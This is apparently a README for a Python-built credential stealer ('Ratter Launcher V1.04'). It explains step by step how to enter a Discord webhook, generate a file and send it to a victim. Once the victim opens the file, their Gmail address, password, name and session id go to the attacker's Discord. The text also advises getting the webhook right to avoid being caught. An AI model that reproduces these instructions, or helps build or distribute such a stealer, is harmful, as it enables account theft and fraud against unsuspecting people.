Made with python code easy to edit if needed.
1.Download the Ratter LauncherV1.04.exe.
2.Open it.
3.You will see green button and one line. To the line put your discord webhook and then press the genereate file button.
4.Send the file to someone and if someone opens it you can see his account password and details in discord.



Version 1.04

I will update the ratter pretty often to make it better and easier to use.




Takes Gmail,Password,Name,Session id to your discord. Make sure to put right webhook or you will get caught because there will be error if webhook is wrong. In next update i will make that there will not be a error if webhook is wrong and much more features.